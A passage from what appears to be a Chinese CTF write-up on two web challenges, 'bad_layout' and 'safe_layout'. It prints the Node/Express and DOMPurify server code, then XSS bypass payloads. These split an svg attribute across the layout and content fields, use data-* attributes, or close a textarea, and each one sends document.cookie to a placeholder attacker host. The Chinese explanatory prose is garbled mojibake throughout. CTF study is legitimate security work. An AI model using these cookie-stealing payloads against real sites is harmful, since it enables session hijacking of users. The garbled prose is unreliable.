class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content&#125;&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ä»–æŠŠæˆ‘ä»¬è¾“å…¥çš„å†…å®¹å…¨éƒ½æ£€æŸ¥äº†ä¸€éï¼Œä½†æ˜¯é‡‡ç”¨é»˜è®¤çš„é…ç½®ï¼Œæˆ‘ä»¬äº†è§£<code>DOMPurify.sanitize</code>çš„<a href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes">åŸç†</a></p><p>æˆ‘ä»¬è¾“å…¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112503557.png" alt="image-20250312112503557"></p><p>å‘ç°<code>onload</code>è¢«è¿‡æ»¤ä½†æ˜¯æˆ‘ä»¬è¾“å…¥</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">onload</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰è¢«è¿‡æ»¤</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112627575.png" alt="image-20250312112627575"></p><p>é‚£æˆ‘å°±å¯ä»¥æ‹¼æ¥æ„é€ xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">layout:  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br><br>content:    test&quot; onload=location.href=&quot;http://IP:PORT?flag=&quot;+document.cookie src=&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112836467.png" alt="image-20250312112836467"></p><p>æˆåŠŸè·³è½¬</p><p>ç¬¬äºŒç§æ€è·¯å°±æ˜¯é—­åˆ<code>&lt;/textarea&gt;</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184144330.png" alt="image-20250312184144330"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184425906.png" alt="image-20250312184425906"></p><p>ä¹Ÿæ˜¯æˆåŠŸè§£æ</p><h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe_layout"></a>safe_layout</h2><p>éš¾åº¦é«˜çš„å“äºº(bushi)ğŸ˜ï¼Œå‰ç«¯çš„çŸ¥è¯†è¿˜æ˜¯è¿·è¿·ç³Šç³Šçš„ä¸æ¸…æ¥š</p><p>æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>çœ‹è¾“å…¥éƒ¨åˆ†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ä¸<code>bady logout</code>ç›¸æ¯”åŠ äº†<code> &#123; ALLOWED_ATTR: [] &#125;</code>,ç¦ç”¨æ‰€æœ‰<code>html</code>æ ‡ç­¾,<code>src</code>ä¼šè¢«è¿‡æ»¤</p><p>ä½†æ˜¯data-* å’Œ aria-* ç±»çš„å±æ€§æ˜¯ä¸ä¼šè¢«è¿‡æ»¤çš„</p><p>å‚è€ƒè¿™ç¯‡<a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">æ–‡ç« </a></p><p><code>data-*</code> å’Œ <code>aria-*</code> æ˜¯ â€œå®‰å…¨çš„â€ è‡ªå®šä¹‰å±æ€§ï¼Œä¸ä¼šè¢«è¿‡æ»¤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg data-type=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;&lt;/svg&gt;<br><br>test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312120033286.png" alt="image-20250312120033286"></p><p>æˆåŠŸè§£æ</p><p>åŒæ ·ä¹Ÿå¯ä»¥ç”¨<code>&lt;/textarea&gt;</code>æ„é€ é—­åˆ</p><p>ç”±äºdata-* å’Œ aria-* ç±»çš„å±æ€§æ˜¯ä¸ä¼šè¢«è¿‡æ»¤çš„</p><p>æˆ‘ä»¬é‡‡ç”¨data-* å’Œ aria-* ç±»çš„å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-c</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img 